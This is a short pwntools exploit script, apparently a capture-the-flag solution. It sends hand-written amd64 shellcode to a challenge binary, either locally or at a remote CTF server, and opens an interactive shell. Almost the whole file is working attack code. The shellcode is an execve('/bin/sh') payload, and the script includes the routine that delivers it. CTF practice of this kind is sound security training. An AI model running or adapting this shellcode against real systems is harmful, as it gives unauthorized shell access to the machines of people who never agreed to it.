#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
context.arch = "amd64"
pwn_file="./chall"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23600)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

shellcode = """
    call here
    .ascii "/bin/sh"
    .byte 0
here:
     pop rdi
     xor rsi, rsi
     xor rdx, rdx
     mov al, 0x3b
     syscall
"""
sh = asm(shellcode)

debug()
r.sendlineafter("Give me your shellcode :", sh)
r.interactive()
